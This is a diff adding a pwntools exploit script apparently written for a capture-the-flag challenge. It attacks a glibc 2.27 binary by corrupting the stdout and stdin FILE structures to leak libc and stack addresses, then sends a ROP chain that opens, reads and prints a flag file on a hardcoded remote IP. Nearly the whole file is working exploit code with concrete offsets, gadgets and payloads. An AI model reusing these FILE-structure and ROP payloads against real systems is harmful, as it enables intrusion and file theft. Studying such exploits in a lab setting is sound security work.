@@ -1,0 +1,214 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host localhost --port 11106 ./chall
+from pwn import *
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('./chall')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+# host = args.HOST or 'localhost'
+# port = int(args.PORT or 11102)
+
+host = args.HOST or '165.22.101.113'
+port = int(args.PORT or 11102)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+dir /root/Desktop/libc/glibc-2.27/libio/
+continue
+b *edit+152
+# b *add+77
+c
+c
+c
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+io = start()
+
+def add():
+    io.sendlineafter("> ","1")
+    io.sendlineafter(": ",str(0x200000))
+    io.sendafter(": ","a")
+
+def edit(start,msg):
+    io.sendlineafter("> ","2")
+    io.sendlineafter(": ",str(start))
+    io.sendafter(": ",msg)
+
+libc = ELF("./libc-2.27.so")
+
+idx_stdout  = libc.sym["_IO_2_1_stdout_"]
+idx_stdin   = libc.sym["_IO_2_1_stdin_"]
+# b *malloc+132
+# mmap64+65
+# 0x00007f4689e0a000+0x93b20
+# 0x7f287737b17b
+add()
+p = ''
+p+= p64(0xfbad1800)[1:] # _flags
+p+= p64(0) # _IO_read_ptr
+p+= p64(0) # _IO_read_end
+p+= p64(0) # _IO_read_base
+p+= b'\x08' # _IO_write_ptr
+edit(0x201000-0x10+idx_stdout+1,p)
+
+# x/30gx &_IO_2_1_stdout_
+# b *menu+30
+# puts+203
+# _IO_file_xsputn+186
+# _IO_file_overflow+230
+# _IO_do_write+173
+# _IO_file_write+40
+
+# int
+# _IO_new_file_overflow (_IO_FILE *f, int ch){
+#   ..
+#   if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
+#     {
+#     ...
+#       if (f->_IO_read_ptr == f->_IO_buf_end)
+#   f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
+#       f->_IO_write_ptr = f->_IO_read_ptr;
+#       f->_IO_write_base = f->_IO_write_ptr;
+#       ...
+#   if (ch == EOF)
+#     return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base);
+#   ..
+# }
+
+# int
+# _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+# {
+#   return (to_do == 0
+#     || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
+# }
+
+# static
+# _IO_size_t
+# new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+# {
+#   _IO_size_t count;
+#   if (fp->_flags & _IO_IS_APPENDING)
+#     fp->_offset = _IO_pos_BAD;
+#   else if (fp->_IO_read_end != fp->_IO_write_base)
+#     {
+#       _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
+#       ...
+#   count = _IO_SYSWRITE (fp, data, to_do);
+#   ...
+# }
+
+leak = u64(io.recv(6).ljust(8,b"\x00"))
+libc.address = leak - 0x3ed8b0
+environ     = libc.sym['environ']
+
+print "LIBC leak: " + hex(leak)
+print "LIBC base: " + hex(libc.address)
+
+pop_rdi = libc.address + 0x00000000000215bf
+pop_rsi = libc.address + 0x0000000000023eea
+pop_rdx = libc.address + 0x0000000000001b96
+pop_rax = libc.address + 0x0000000000043ae8
+syscall_ret = next(libc.search(asm("syscall ; ret")))
+
+def syscall(rax, rdi, rsi, rdx):
+    chain = p64(pop_rax) + p64(rax)
+    chain += p64(pop_rdi) + p64(rdi)
+    chain += p64(pop_rsi) + p64(rsi)
+    chain += p64(pop_rdx) + p64(rdx)
+    chain += p64(syscall_ret)
+    return chain
+
+p = ''
+# p+= p64(0xfbad1800) # _flags
+# p+= p64(0) # _IO_read_ptr
+p+= p64(environ) # _IO_read_end
+p+= p64(0) # _IO_read_base
+p+= p64(environ) # _IO_write_base
+p+= p64(environ+8) # _IO_write_ptr
+edit(0x201000-0x10+idx_stdout+16,p)
+
+stack = u64(io.recv(8))
+print hex(stack)
+to_stack = stack - 0x110
+print hex(to_stack)
+
+p = ''
+# p  = p64(0xfbad208b) # _flags sama
+# p += p64(stdin) # _IO_read_ptr
+# p += p64(0) * 5 # _IO_read_end - _IO_write_end
+p += p64(to_stack) # _IO_buf_base
+p += p64(to_stack + 0x2000) # _IO_buf_end, len 0x2000 bytes
+
+# b *readint+42
+# fgets+168
+# _IO_getline+141
+# __uflow+141
+# _IO_default_uflow+47
+# _IO_file_underflow+292
+edit(0x201000-0x10+idx_stdin+56,p)
+
+size=0x100
+read=1
+if read:
+    p = syscall(257, 0xffffffffffffff9c, to_stack+216, 0)
+    p += syscall(0, 3, to_stack-size, size)
+    p += syscall(1, 1, to_stack-size, size)
+    # p += './flag.txt'.ljust(40,"\x00")
+    p += '/home/ezfile/flag-c5bb96364f4b6f4c2fea077655c48304.txt'.ljust(40,"\x00")
+else:
+    p = syscall(257, 0xffffffffffffff9c, to_stack+288, 0)
+    p += syscall(78, 3, to_stack-size, size)
+    p += syscall(0, 3, to_stack-size, size)
+    p += syscall(1, 1, to_stack-size, size)
+    # p += '/home/ezfile1/'.ljust(40,"\x00")
+    p += './'.ljust(40,"\x00")
+#
+# # b *readint+76
+# # b *fgets+285
+io.sendafter("> ",p)
+# writev
+# rt_sigprocmask
+# getpid
+# gettid
+# tgkill
+
+io.interactive()
